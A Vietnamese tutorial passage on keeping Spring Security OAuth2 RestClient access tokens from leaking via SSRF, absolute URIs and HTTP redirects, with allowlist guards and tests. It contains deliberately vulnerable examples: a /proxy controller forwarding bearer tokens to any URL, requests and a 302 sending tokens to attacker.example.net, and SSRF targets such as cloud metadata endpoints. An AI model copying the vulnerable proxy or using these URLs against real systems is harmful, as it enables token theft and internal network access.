# 18.10. Giới hạn host, redirect và nguy cơ làm lộ access token

## Mục tiêu bài học

Trong **Spring Security OAuth 2.0 / OpenID Connect (OIDC) Client** chạy trên **Spring MVC / Servlet**, ứng dụng thường dùng `RestClient` để gọi Resource Server bằng access token đã được Authorization Server (AS) cấp.

Ví dụ:

~~~http
GET /api/orders HTTP/1.1
Host: orders-api.example.com
Authorization: Bearer ACCESS_TOKEN_FOR_ORDERS_API
~~~

Lời gọi an toàn khi bearer access token chỉ được gửi tới **đúng điểm nhận đáng tin cậy**. Nếu URL của REST client bị điều khiển bởi input, redirect dẫn sang host khác, hoặc một interceptor tự gắn token vào mọi request, ứng dụng có thể vô tình chuyển credential tới server không được phép nhận.

Bài này tập trung vào **giới hạn scheme/host/port**, **kiểm soát HTTP redirect** và **ngăn lộ access token**.

Sau bài học, bạn có thể:

- Phân biệt `registrationId`, client ID, token audience, host và origin thực tế.
- Giải thích tại sao `RestClient.baseUrl(...)` không phải host allowlist.
- Phân tích SSRF, open redirect và khả năng bearer token đi theo redirect.
- Hiểu vì sao xử lý `Authorization` qua redirect phụ thuộc HTTP client, request factory và interceptor.
- Tạo dedicated RestClient dùng HTTPS, giới hạn host/port, vô hiệu hóa automatic redirect.
- Sử dụng access token từ `OAuth2AuthorizedClient` hoặc OAuth2-aware interceptor theo phạm vi API phù hợp.
- Xử lý các mã 3xx, 401, 403; phân biệt reauthorization với retry request nghiệp vụ.
- Bảo vệ token khỏi logs, tracing, proxy, DNS rebinding và việc gửi URL tùy ý.
- Thiết kế kiểm thử để xác minh token không được chuyển đến host ngoài.

## 1. Bối cảnh: Employee Portal gọi Orders API

Giả sử hệ thống gồm:

- **Employee Portal**: Spring Boot Servlet application, là OAuth2 Client và OIDC Relying Party.
- **Corporate OP**: OpenID Provider/Authorization Server.
- **Orders API**: OAuth2 Resource Server.

Sau khi user hoàn thành Authorization Code Login, Spring Security tạo Authentication và một `OAuth2AuthorizedClient` cho registration `corporate`. Portal cần gọi Orders API bằng access token tương ứng.

~~~mermaid
sequenceDiagram
    autonumber
    actor U as Người dùng
    participant B as Browser
    participant P as Spring MVC Portal
    participant OP as OpenID Provider
    participant API as Orders API
    U->>B: Truy cập /orders
    B->>P: HTTP request với session
    Note over P: Khôi phục Authentication và authorized client
    P->>OP: Refresh token nếu cần
    OP-->>P: Access token mới nếu refresh
    P->>API: GET /api/orders, Bearer access token
    API-->>P: Dữ liệu đơn hàng
    P-->>B: Render kết quả
~~~

Lời gọi đúng:

~~~http
GET https://orders-api.example.com/api/orders
Authorization: Bearer <ACCESS_TOKEN_FOR_ORDERS_API>
~~~

Lời gọi sai:

~~~http
GET https://attacker.example.net/collect
Authorization: Bearer <ACCESS_TOKEN_FOR_ORDERS_API>
~~~

Nếu lời gọi thứ hai xảy ra, token đã đến một host không được phép. Vì access token dạng bearer có thể được phát lại bởi bên giữ token trong thời hạn hợp lệ, đây là sự cố bảo mật kể cả khi attacker chưa chắc dùng được token ở mọi API.

## 2. Host, origin và audience không giống nhau

| Khái niệm | Ví dụ | Ý nghĩa |
|---|---|---|
| Registration ID | `corporate` | Khóa nội bộ Spring Security chọn client registration |
| Client ID | `employee-portal` | Danh tính OAuth client tại AS |
| Issuer | `https://id.example.com/realms/company` | Nhà phát hành token |
| Access token audience | `orders-api` | Resource Server mà token được cấp cho |
| HTTP host | `orders-api.example.com` | Host của request mạng |
| HTTP origin | `https://orders-api.example.com:443` | Scheme + host + port |
| Scope | `orders.read` | Quyền OAuth được cấp |
| Redirect target | `https://other.example.net/path` | Đích request khác nếu client follow redirect |

### 2.1. Registration ID không giới hạn host

`registrationId="corporate"` chỉ cho biết Spring Security sử dụng đăng ký OAuth client nào. Nó không tự ngăn RestClient gửi token cho `attacker.example.net`.

### 2.2. Token audience không giới hạn HTTP client

Một JWT access token có `aud=orders-api` có thể bị Resource Server khác từ chối vì sai audience. Tuy nhiên, token vẫn có thể bị **gửi ra ngoài** nếu RestClient được yêu cầu kết nối đến host khác.

Audience validation phía API và host allowlist phía client **là hai lớp bảo vệ độc lập**.

### 2.3. ID token không dùng thay access token

OIDC ID token phục vụ Relying Party xác minh kết quả xác thực End-User. Khi gọi API thông thường, hãy lấy access token của authorized client:

~~~java
String bearer =
        authorizedClient.getAccessToken().getTokenValue();
~~~

Đừng lấy:

~~~java
String wrongBearer =
        oidcUser.getIdToken().getTokenValue();
~~~

ID token và access token có thể cùng là JWT, nhưng khác mục đích và audience.

## 3. Nguy cơ SSRF và credentialed open proxy

Một controller nguy hiểm:

~~~java
@GetMapping("/proxy")
String proxy(
        @RequestParam String targetUrl,
        @RegisteredOAuth2AuthorizedClient("corporate")
        OAuth2AuthorizedClient client) {

    return restClient.get()
            .uri(targetUrl)
            .headers(headers -> headers.setBearerAuth(
                    client.getAccessToken().getTokenValue()))
            .retrieve()
            .body(String.class);
}
~~~

Input:

~~~text
/proxy?targetUrl=https://attacker.example.net/collect
~~~

có thể khiến backend gửi bearer token tới attacker.

Rủi ro bao gồm:

- **SSRF:** backend truy cập URL không được phép từ vị trí mạng của nó.
- **Credential exfiltration:** access token bị đưa vào header của request đến host bên ngoài.
- **Confused deputy:** backend dùng quyền/token của mình thay mặt một input không tin cậy.
- **Internal network access:** URL có thể trỏ tới endpoint chỉ có backend truy cập được.

Không thiết kế endpoint cho browser cung cấp đồng thời `registrationId`, principal và full URL rồi backend tự cấp token và gọi URL ấy.

## 4. Vì sao `baseUrl` không phải biện pháp bảo mật?

Ví dụ:

~~~java
RestClient ordersClient = RestClient.builder()
        .baseUrl("https://orders-api.example.com")
        .build();
~~~

Sử dụng:

~~~java
ordersClient.get()
        .uri("/api/orders")
        .retrieve()
        .body(String.class);
~~~

thường đi tới Orders API. Nhưng nếu application truyền một **URI tuyệt đối**, host cuối có thể khác baseUrl.

Vì vậy `baseUrl(...)` là **tiện ích để dựng URI**, không phải một chính sách xác nhận host.

### 4.1. Không để người dùng quyết định full URL

Nếu nghiệp vụ chỉ cần order ID, nhận:

~~~text
GET /orders/ORD-123
~~~

và xây URI:

~~~java
ordersClient.get()
        .uri("/api/orders/{orderId}", orderId)
        .retrieve()
        .body(OrderView.class);
~~~

`orderId` phải được validate theo schema nghiệp vụ. Không đổi nó thành một full URL do caller định nghĩa.

### 4.2. Tránh nối chuỗi không kiểm soát

Mẫu:

~~~java
String url = "https://orders-api.example.com" + userInput;
~~~

dễ tạo nhầm lẫn về path, query và URL encoding. Dùng URI template cố định và kiểm tra URL cuối trước request.

### 4.3. Không chỉ xét URL ở tầng controller

Một URL có thể được tạo từ service layer, message queue, cấu hình tenant hoặc một thư viện gọi HTTP gián tiếp. Khi RestClient có bearer token, nên có **guard ngay trong client chuyên dụng** để mọi call path đều bị kiểm tra.

## 5. Chính sách allowlist scheme, host, port

Một policy cho Orders API:

~~~text
Scheme: HTTPS
Host: orders-api.example.com
Port: mặc định HTTPS hoặc 443
Userinfo: không được có
Redirect: không tự động theo
~~~

### 5.1. Bắt buộc HTTPS

~~~text
https://orders-api.example.com/api/orders -> cho phép
http://orders-api.example.com/api/orders  -> từ chối
~~~

Nếu token đã gửi qua HTTP, redirect lên HTTPS sau đó không thể đảo ngược nguy cơ lộ credential của request ban đầu.

### 5.2. Host phải khớp chính xác

~~~text
orders-api.example.com              -> cho phép
orders-api.example.com.evil.net     -> từ chối
orders-api-example.com              -> từ chối
evil-orders-api.example.com         -> từ chối
~~~

Đừng dùng `contains(...)` trên chuỗi URL/hostname. Một host giả có thể chứa nguyên tên host tin cậy.

### 5.3. Kiểm tra port

~~~text
https://orders-api.example.com      -> port HTTPS mặc định
https://orders-api.example.com:443  -> port 443
https://orders-api.example.com:8443 -> port không được cho phép
~~~

Một port khác trên cùng host có thể chạy ứng dụng khác không được phép nhận token.

### 5.4. Tránh nhầm userinfo với host

Một URL có dạng:

~~~text
https://orders-api.example.com@attacker.example.net/collect
~~~

Host thực tế là `attacker.example.net`; chuỗi `orders-api.example.com` nằm trong userinfo.

Không kiểm tra bằng `url.contains("orders-api.example.com")`. Parse URI và kiểm tra `getHost()`, `getRawUserInfo()`.

### 5.5. Canonicalization và địa chỉ đặc biệt

Cần xem:

- Chữ hoa/chữ thường hostname.
- Trailing dot.
- Punycode/Internationalized Domain Names.
- IPv4/IPv6 literal.
- URI không parse được host hoặc chứa ký tự bất thường.
- URL encoding và path normalization.

Với host cố định, thường dễ kiểm soát khi so sánh **hostname chính xác** và từ chối mọi dạng không mong đợi thay vì tự đoán cách normalize.

### 5.6. Host đúng chưa có nghĩa mọi path đều được phép

Nếu một host chạy cả API công khai và endpoint quản trị, không nên cho một REST client mang token user gọi tùy ý mọi path.

Dùng đường dẫn cố định hoặc route templates, và áp policy theo path/method khi contract API yêu cầu.

## 6. HTTP redirect có thể chuyển credential sang đích khác

Một response của Orders API:

~~~http
HTTP/1.1 302 Found
Location: https://attacker.example.net/collect
~~~

Nếu request ban đầu có Bearer header và HTTP client tự follow Location, có thể phát sinh request thứ hai.

Nguy cơ lộ token xảy ra nếu request thứ hai **giữ hoặc được gắn lại** header Authorization.

### 6.1. Không suy đoán hành vi của mọi HTTP client

Hành vi redirect phụ thuộc:

- HTTP client nền: JDK, Apache HttpClient, hoặc implementation khác.
- `ClientHttpRequestFactory` dùng cho RestClient.
- HTTP method và status code.
- Redirect target cùng origin hay khác origin.
- Header filtering của HTTP client.
- Interceptor hoặc custom logic có gắn lại Bearer token không.

Một số client bỏ Authorization khi redirect cross-origin, một số hạn chế method, một số không auto follow. **Không khẳng định mọi RestClient đều leak, cũng không khẳng định mọi RestClient luôn an toàn**.

### 6.2. Same-origin nghĩa là gì?

Origin được xác định theo scheme, host và port.

~~~text
https://orders-api.example.com
https://orders-api.example.com:8443
http://orders-api.example.com
https://orders-cdn.example.com
~~~

không phải cùng một origin.

Hai subdomain chung domain mẹ cũng không mặc nhiên được phép nhận cùng bearer token.

### 6.3. Redirect cùng host cũng cần thận trọng

Một host có thể chạy nhiều application/path. Việc request cùng host không tự chứng minh route mới cần access token hoặc được phép nhận dữ liệu POST ban đầu.

Khi cần, phải xét path, method, audience và chính sách của endpoint.

### 6.4. Các mã redirect

| Mã | Điều đáng lưu ý |
|---|---|
| 301 | Permanent redirect, có thể được cache |
| 302 | Redirect phổ biến; method behavior tùy client |
| 303 | Thường yêu cầu client chuyển sang GET |
| 307 | Giữ method và body nếu follow |
| 308 | Permanent redirect, giữ method và body nếu follow |

307/308 nguy hiểm với POST: body có thể được gửi lại tới host mới **cùng header Authorization** nếu client không có policy bảo vệ.

Không chỉ xử lý 302 rồi bỏ qua các loại 3xx khác.

## 7. Tắt automatic redirect cho API mang bearer token

Với client chỉ gọi một API tin cậy, chiến lược đơn giản:

1. Đích API được xác định từ cấu hình/backend.
2. URI cuối cùng phải khớp HTTPS, host, port được duyệt.
3. HTTP client **không tự động theo redirect**.
4. Nếu nhận 3xx, ứng dụng đánh giá `Location` thay vì tự follow.
5. Nếu cần request khác, tạo request theo policy mới và không tự chuyển credential.

### 7.1. Vì sao guard ban đầu có thể không đủ?

Một interceptor có thể kiểm tra request đầu:

~~~text
https://orders-api.example.com/api/orders
~~~

nhưng redirect tiếp theo do HTTP client nền có thể diễn ra **bên dưới hoặc ngoài cùng một interceptor**, tùy implementation.

Vì vậy kiểm tra URI ở interceptor không tự chứng minh mọi redirect hop đã được validate. Tắt auto follow ở request factory là lớp bảo vệ độc lập.

### 7.2. Redirect từ host tin cậy không tự làm target tin cậy

Orders API có thể tồn tại open redirect hoặc cấu hình lỗi. Một `Location` trong response là dữ liệu cần kiểm tra, không phải chứng thư cho phép chuyển access token sang target mới.

### 7.3. Nếu API chuyển sang CDN hoặc host mới

Không gửi token Orders API theo 302 sang CDN chỉ vì response yêu cầu.

Nếu CDN dùng signed URL, có thể dùng một HTTP client **không có bearer token** để tải tài nguyên theo policy. Nếu CDN là Resource Server khác, cần token đúng audience/resource.

Nếu API đổi domain lâu dài, xác minh host, TLS, egress và token contract rồi cập nhật cấu hình có kiểm soát.

## 8. Viết destination guard bằng `java.net.URI`

~~~java
import java.net.URI;

public final class OrdersDestinationPolicy {

    private static final String TRUSTED_HOST =
            "orders-api.example.com";

    private OrdersDestinationPolicy() {}

    public static void requireTrusted(URI uri) {
        if (uri == null
                || !uri.isAbsolute()
                || uri.isOpaque()
                || !"https".equalsIgnoreCase(uri.getScheme())
                || !TRUSTED_HOST.equalsIgnoreCase(uri.getHost())
                || (uri.getPort() != -1 && uri.getPort() != 443)
                || uri.getRawUserInfo() != null
                || uri.getRawFragment() != null) {
            throw new IllegalArgumentException(
                    "Untrusted Orders API destination");
        }
    }
}
~~~

Policy này từ chối:

~~~text
http://orders-api.example.com/api/orders
https://orders-api.example.com:8443/api/orders
https://orders-api.example.com@evil.net/api/orders
https://orders-api.example.com.evil.net/api/orders
https://localhost/api/orders
https://127.0.0.1/api/orders
https://169.254.169.254/latest/meta-data
~~~

Đây là **kiểm tra URI ở tầng ứng dụng**, chưa bao phủ toàn bộ SSRF/DNS rebinding. Cần kết hợp network controls nếu kết nối có thể bị đưa tới IP ngoài dự kiến.

## 9. RestClient Servlet với Apache HttpClient 5

### 9.1. Dependencies

Ví dụ Maven:

~~~xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>

<dependency>
    <groupId>org.apache.httpcomponents.client5</groupId>
    <artifactId>httpclient5</artifactId>
</dependency>
~~~

Để tương thích, nên sử dụng dependency management của Spring Boot. Ví dụ dùng Spring Framework 6.1+ `RestClient`.

### 9.2. Dedicated client với redirect bị tắt

~~~java
import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
import org.springframework.web.client.RestClient;

@Configuration
public class OrdersRestClientConfiguration {

    @Bean
    RestClient ordersRestClient() {
        CloseableHttpClient httpClient = HttpClients.custom()
                .disableRedirectHandling()
                .build();

        var requestFactory =
                new HttpComponentsClientHttpRequestFactory(httpClient);

        return RestClient.builder()
                .baseUrl("https://orders-api.example.com")
                .requestFactory(requestFactory)
                .requestInterceptor((request, body, execution) -> {
                    OrdersDestinationPolicy.requireTrusted(
                            request.getURI());
                    return execution.execute(request, body);
                })
                .build();
    }
}
~~~

Ý nghĩa:

- `baseUrl` là default URI cho các lời gọi path tương đối.
- Destination interceptor kiểm tra URI thực tế trước outbound request.
- `disableRedirectHandling()` của Apache HttpClient 5 yêu cầu không tự follow HTTP 3xx.
- Client chỉ dùng cho Orders API.

Cách tắt redirect với JDK HttpClient hoặc request factory khác **không nhất thiết giống cú pháp Apache**. Cần kiểm tra stack thực tế đang được cấu hình.

### 9.3. Đừng coi interceptor là bảo vệ duy nhất

Nếu không tắt automatic redirect, HTTP client nền có thể xử lý Location ở một tầng không đi qua same-origin guard của ứng dụng.

Kết hợp **guard URL cuối cùng + disable redirect + client chuyên dụng** dễ suy luận hơn.

## 10. Sử dụng access token trong controller

~~~java
import org.springframework.security.oauth2.client.OAuth2AuthorizedClient;
import org.springframework.security.oauth2.client.annotation.RegisteredOAuth2AuthorizedClient;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestClient;

@RestController
public class OrdersProxyController {

    private final RestClient ordersRestClient;

    public OrdersProxyController(RestClient ordersRestClient) {
        this.ordersRestClient = ordersRestClient;
    }

    @GetMapping("/orders/{orderId}")
    OrderView order(
            @PathVariable String orderId,
            @RegisteredOAuth2AuthorizedClient("corporate")
            OAuth2AuthorizedClient authorizedClient) {

        if (authorizedClient == null
                || authorizedClient.getAccessToken() == null) {
            throw new IllegalStateException(
                    "No authorized client available");
        }

        String accessToken =
                authorizedClient.getAccessToken().getTokenValue();

        return ordersRestClient.get()
                .uri("/api/orders/{orderId}", orderId)
                .headers(headers -> headers.setBearerAuth(accessToken))
                .retrieve()
                .body(OrderView.class);
    }

    record OrderView(String id, String description) {}
}
~~~

Đoạn code minh họa:

1. Chọn authorized client của registration `corporate`.
2. Lấy **access token**.
3. Gọi path cố định với route template.
4. Host guard kiểm tra request.
5. HTTP client không tự follow redirect.

Đây chưa phải mã production hoàn chỉnh: còn cần validation `orderId`, xử lý lỗi API và token expiry/refresh qua `OAuth2AuthorizedClientManager` hoặc integration phù hợp.

Không trả raw access token về browser chỉ để frontend gọi API nếu kiến trúc là backend-for-frontend.

## 11. OAuth2-aware RestClient và interceptor

Spring Security ở những phiên bản hỗ trợ tích hợp `RestClient` có `OAuth2ClientHttpRequestInterceptor`, có thể dùng `OAuth2AuthorizedClientManager` để lấy và gắn access token.

### 11.1. Global interceptor có thể quá rộng

Mô hình rủi ro:

~~~text
Global RestClient
  + OAuth2 interceptor
  + mọi component có thể truyền full URL
  = có thể gửi access token sai host
~~~

Không nên gắn token mặc định cho mọi outbound request mà application tự do tạo URL.

### 11.2. Client có OAuth interceptor và host guard

Ví dụ với Spring Security hỗ trợ `OAuth2ClientHttpRequestInterceptor` (chẳng hạn dòng 6.4+):

~~~java
import org.apache.hc.client5.http.impl.classic.HttpClients;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.web.client.OAuth2ClientHttpRequestInterceptor;
import org.springframework.web.client.RestClient;

@Configuration
public class OAuthOrdersClientConfig {

    @Bean
    RestClient oauthOrdersRestClient(
            OAuth2AuthorizedClientManager manager) {

        var httpClient = HttpClients.custom()
                .disableRedirectHandling()
                .build();

        var factory =
                new HttpComponentsClientHttpRequestFactory(httpClient);

        var oauth =
                new OAuth2ClientHttpRequestInterceptor(manager);

        return RestClient.builder()
                .baseUrl("https://orders-api.example.com")
                .requestFactory(factory)
                .requestInterceptor((request, body, execution) -> {
                    OrdersDestinationPolicy.requireTrusted(
                            request.getURI());
                    return execution.execute(request, body);
                })
                .requestInterceptor(oauth)
                .build();
    }
}
~~~

Khi gọi:

~~~java
import static org.springframework.security.oauth2.client.web.client
        .OAuth2ClientHttpRequestInterceptor.clientRegistrationId;

String orders = oauthOrdersRestClient.get()
        .uri("/api/orders")
        .attributes(clientRegistrationId("corporate"))
        .retrieve()
        .body(String.class);
~~~

Chọn registration không tự bảo đảm token đúng mọi API; AS/RS phải có contract audience/scope phù hợp.

API và phần integration tùy phiên bản Spring Security, nhưng chính sách host và redirect cần được giữ ở mọi bản.

### 11.3. Thứ tự interceptor

Guard nên kiểm tra trước khi request mang token được thực thi. Tuy nhiên, chỉ dựa vào thứ tự interceptor **không giải quyết redirect do client nền tự follow**.

### 11.4. Không gửi token của một API sang API khác

Một access token dành cho Orders API không được mặc định dùng gọi Billing API, kể cả cùng AS. Hãy tách RestClient, registration/token selection và host policy cho từng Resource Server.

## 12. Redirect thủ công khi cần

Nếu API contract cần redirect, có thể xử lý ở tầng ứng dụng:

1. Tắt automatic redirect ở HTTP client.
2. Nhận response 3xx và đọc `Location`.
3. Parse/resolve Location với URI parser chuẩn.
4. Validate scheme, host, port, userinfo và route ở **mỗi hop**.
5. Giới hạn số hop và chặn loop.
6. Quyết định có được gửi token cho đích mới không; không tự chuyển bearer credential qua origin khác.
7. Xem status 307/308 trước khi gửi lại method/body.
8. Nếu target dùng signed URL, cân nhắc client riêng không mang Authorization.

**Không tự xây một redirect handler chung cho mọi API nếu nghiệp vụ không cần redirect.**

### 12.1. Signed URL có thể cũng là credential

Một URL tải file có chữ ký trong query có thể trao quyền tải tài nguyên. Không log hoặc công khai URL nguyên vẹn nếu nó có tính chất credential.

Không kèm thêm access token Orders API vào signed URL nếu không có contract yêu cầu.

## 13. SSRF, DNS và outbound network policy

Một URL không tin cậy có thể nhắm tới:

~~~text
http://127.0.0.1:8080/admin
http://localhost/
http://10.0.1.8/internal
http://169.254.169.254/
http://[::1]/
https://metadata.internal/
~~~

Backend có thể truy cập mạng nội bộ mà browser ngoài không thể. Một proxy có bearer token càng tăng hậu quả khi route không bị giới hạn.

### 13.1. DNS rebinding

Nếu một hostname hợp lệ bị DNS trỏ tới địa chỉ bất ngờ, host string allowlist có thể chưa đủ để bảo đảm destination IP cuối.

Cần cân nhắc:

- Resolver và CNAME có đáng tin cậy không?
- Có route tới private/loopback/link-local IP không?
- DNS có thể thay đổi sau khi validate không?
- HTTP client có resolve lại khi kết nối không?
- Egress firewall/proxy có giới hạn đích thật không?

Một phép kiểm tra DNS một lần rồi kết nối lại sau đó có thể gặp race (TOCTOU).

### 13.2. Egress restrictions

Firewall, cloud security group, service mesh, outbound proxy hoặc NetworkPolicy có thể giới hạn backend chỉ được kết nối tới những API cần thiết.

Đây là lớp bổ sung, không thay thế validation URL và kiểm tra token audience.

### 13.3. Outbound proxy

Nếu REST client dùng proxy, cần biết proxy có quyền thấy/log header Authorization không, TLS có được xác minh tới đúng host cuối không và proxy có thể đổi route hay không.

Không tắt certificate validation hoặc hostname verification để “sửa” vấn đề proxy.

## 14. Những con đường khác làm lộ access token

### 14.1. Query string

Tránh:

~~~text
https://orders-api.example.com/api/orders?access_token=ACCESS_A1
~~~

URL có thể xuất hiện trong access logs, tracing và nơi khác. Dùng Bearer header qua HTTPS.

### 14.2. Logging interceptor

Mẫu nguy hiểm:

~~~java
logger.info("Request headers: {}", request.getHeaders());
~~~

Nếu request có Authorization, giá trị token có thể bị đưa vào log.

Cần redact hoặc không ghi những header nhạy cảm:

~~~text
Authorization
Proxy-Authorization
Cookie
Set-Cookie
~~~

### 14.3. APM và distributed tracing

Một số công cụ capture URL, header hoặc body. Cấu hình để không thu thập access token, refresh token, client secret và session cookie.

Dùng correlation ID độc lập, không dùng token thô hoặc một phần token làm ID.

### 14.4. Exceptions

Không đưa request headers thô vào message hiển thị hoặc log. Ví dụ tránh:

~~~text
Request failed with Authorization=Bearer ACCESS_A1
~~~

Thay bằng mã lỗi, destination đã chuẩn hóa, registration ID và correlation ID.

### 14.5. HTTPS không thay host policy

HTTPS bảo vệ kênh tới **host đã kết nối**. Nếu đó là host attacker có certificate hợp lệ, token vẫn đến attacker.

Do đó cần cả TLS verification **và** kiểm soát đích.

## 15. API 3xx, 401, 403 và retry

| Response | Ý nghĩa thường gặp | Phản ứng phù hợp |
|---|---|---|
| 3xx | Server đề nghị chuyển URL | Không auto follow với token; xem Location |
| 401 | Token không hợp lệ/không được chấp nhận | Xem token, issuer, audience, expiry |
| 403 | Thiếu quyền cho hành động | Xem scope/authority/ownership |
| 5xx | API server lỗi | Retry có giới hạn, xét idempotency |
| Timeout | Không biết server đã xử lý hay chưa | Không retry mù tác vụ có side effect |

### 15.1. 401 không đồng nghĩa phải đổi host

Nếu Orders API trả 401, kiểm tra access token, token expiry, audience, issuer, scope và revocation. Không thử gửi cùng bearer token tới nhiều host khác để dò một host chấp nhận.

### 15.2. 403 không tự được sửa bằng refresh

Nếu thiếu `orders.approve`, refresh token thường không tạo thêm quyền. Cần AS/RS policy và authorization nghiệp vụ.

### 15.3. Không retry POST tùy tiện

Nếu POST thanh toán/duyệt đơn trả timeout hoặc redirect 307, retry có thể gây side effect trùng. Cần idempotency và kiểm soát redirect riêng.

## 16. OIDC redirect khác REST client redirect

OIDC Authorization Code flow có:

- Browser redirect tới OP.
- OP redirect về callback đã đăng ký của RP.
- RP đối chiếu `state`, PKCE/nonce theo flow, và xác minh token.

Đó là **inbound login**.

Trong bài này, RestClient gửi bearer access token tới Orders API và có thể nhận HTTP 3xx. Đây là **outbound HTTP**. OIDC `state` và PKCE **không bảo vệ tự động** đường đi của access token nếu RestClient tự follow redirect.

| Ranh giới | Kiểm soát chính |
|---|---|
| Browser → RP callback | Registered redirect URI, state, PKCE/nonce |
| RP → Token endpoint | Client authentication, TLS, grant |
| RP → Resource Server | Access token, host policy, HTTPS |
| HTTP redirect target | Redirect policy và kiểm tra destination |
| API authorization | Token validation, audience, scope, ownership |

## 17. Tách client theo Resource Server

Một ứng dụng có thể gọi:

~~~text
Orders API    -> orders-api.example.com    -> orders.read
Billing API   -> billing-api.example.com   -> billing.read
Reports API   -> reports-api.example.com   -> reports.read
~~~

Nên có RestClient riêng cho từng API với:

- Base URL và hostname được duyệt.
- Chính sách redirect rõ ràng.
- OAuth registration/token phù hợp audience.
- Logging redaction.
- Timeout và retry policy.
- Route templates được kiểm soát.

Không dùng một global RestClient tự gắn token của principal hiện tại cho mọi domain mà caller đưa vào.

### 17.1. Token service cũng phải được giới hạn

Grant `client_credentials` cấp token cho client/service, không cần user OIDC. Nếu service token có quyền rộng, gửi sai host có thể gây hậu quả nghiêm trọng hơn token của một user.

Các biện pháp host/redirect/egress áp dụng cho cả user token và service token.

## 18. Kiểm thử giới hạn host và redirect

### 18.1. Các trường hợp cần thử

| Input/response | Kết quả mong muốn |
|---|---|
| URI tương đối `/api/orders` | Kết nối đúng Orders API |
| URI tuyệt đối host attacker | Từ chối trước request |
| URI có userinfo `orders-api.example.com@evil.net` | Từ chối |
| HTTP thay HTTPS | Từ chối |
| Port 8443 khác allowlist | Từ chối |
| Host chỉ chứa chuỗi gần giống | Từ chối |
| API trả 302 sang host khác | Không auto follow |
| API trả 307/308 sang host khác | Không gửi lại method/body/token |
| API trả 401 | Không tự đổi host hoặc lộ token |
| API trả 403 | Không tự nâng quyền |
| Logging bật | Không có raw token |
| DNS trỏ IP không mong đợi | Egress policy từ chối |

### 18.2. Unit test cho URI policy

~~~java
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

import java.net.URI;
import org.junit.jupiter.api.Test;

class OrdersDestinationPolicyTest {

    @Test
    void acceptsApprovedOrigin() {
        assertDoesNotThrow(() ->
                OrdersDestinationPolicy.requireTrusted(
                        URI.create(
                                "https://orders-api.example.com/api/orders")));
    }

    @Test
    void rejectsWrongHost() {
        assertThrows(IllegalArgumentException.class, () ->
                OrdersDestinationPolicy.requireTrusted(
                        URI.create(
                                "https://evil.example.net/collect")));
    }

    @Test
    void rejectsHttp() {
        assertThrows(IllegalArgumentException.class, () ->
                OrdersDestinationPolicy.requireTrusted(
                        URI.create(
                                "http://orders-api.example.com/api/orders")));
    }

    @Test
    void rejectsUnexpectedPort() {
        assertThrows(IllegalArgumentException.class, () ->
                OrdersDestinationPolicy.requireTrusted(
                        URI.create(
                                "https://orders-api.example.com:8443/orders")));
    }
}
~~~

Unit test này chỉ xác minh URI policy, **không chứng minh hành vi redirect của HTTP client**.

### 18.3. Integration test redirect

1. Dựng Orders API test server trả 302/307/308 với `Location` trỏ đến test server khác.
2. Sử dụng chính `RestClient` và request factory của production.
3. Xác minh test server thứ hai không nhận request và không nhận Bearer token.
4. Thử URI tuyệt đối sai host/port.
5. Kiểm tra server đầu nhận token giả đúng như mong đợi.
6. Kiểm tra logs không xuất raw token.
7. Nếu có manual redirect, xác minh mỗi hop được validate và token được xử lý theo policy.

Mock chỉ ở tầng interceptor có thể không thực hiện redirect thật của HTTP client nền. Vì vậy integration test bằng HTTP test servers có giá trị khác unit test.

Không dùng access token production trong thử nghiệm.

## 19. Khi nghi ngờ đã lộ token

Nếu một log hoặc network capture cho thấy access token được gửi sai host:

1. Ngăn đường lộ: giới hạn URI, chặn URL động, tắt auto redirect.
2. Xác định token type, registration, principal và API liên quan mà không chia sẻ giá trị raw.
3. Đánh giá revocation/rotation tại AS theo quy trình ứng phó.
4. Xem refresh token, client secret và session cookie có bị lộ cùng không.
5. Kiểm tra egress logs, API logs và hành vi sử dụng bất thường.
6. Xử lý bản sao credential trong logs/tickets/tracing theo chính sách.
7. Bổ sung kiểm thử và network restrictions.

**Xóa `OAuth2AuthorizedClient` cục bộ không tự thu hồi token tại AS.** API vẫn có thể chấp nhận access token cho tới khi expiry/revocation theo policy.

## 20. Hiểu nhầm thường gặp

**“Có baseUrl rồi thì không thể gọi host khác.”**

Sai. URI tuyệt đối có thể thay thế đích. Cần destination guard.

**“HTTP client nào cũng forward Authorization khi redirect.”**

Không. Phụ thuộc implementation.

**“HTTP client nào cũng bỏ Authorization khi redirect cross-origin.”**

Cũng không thể mặc định. Tùy cấu hình và custom interceptor; cần test.

**“Redirect từ host tin cậy nghĩa là host đích tin cậy.”**

Không. Có thể là open redirect hoặc lỗi cấu hình. Đích phải được duyệt riêng.

**“Hai subdomain cùng domain mẹ nên dùng chung access token.”**

Không. Origin và Resource Server có thể khác nhau.

**“Audience của token đủ ngăn lộ token.”**

Không. Audience hạn chế nơi chấp nhận token, không ngăn client gửi token sai host.

**“HTTPS bảo đảm không lộ token.”**

Không nếu client kết nối nhầm host attacker hợp lệ qua HTTPS.

**“OIDC state/PKCE đã bảo vệ redirect của RestClient.”**

Không. State/PKCE bảo vệ Authorization Code flow, không áp policy cho outbound HTTP.

**“API trả 302 thì luôn follow với bearer token.”**

Không. Đánh giá Location, host, audience và contract.

**“Chỉ chặn private IP là đã chống SSRF hoàn toàn.”**

Không. Còn DNS, redirect, proxy và các host công khai không tin cậy.

## 21. Tình huống thực hành

### Tình huống A: URL từ browser

Controller nhận `targetUrl` và dùng RestClient có Bearer token.

**Xử lý:** không nhận full URL; build URL từ route/ID nghiệp vụ rồi dùng destination guard.

### Tình huống B: 302 sang CDN

Orders API redirect đến `https://files.example.net/export`.

**Xử lý:** không tự follow với Orders token. Dùng client khác không kèm token hoặc token đúng resource nếu contract cho phép.

### Tình huống C: POST gặp 307

API trả 307 đến host mới.

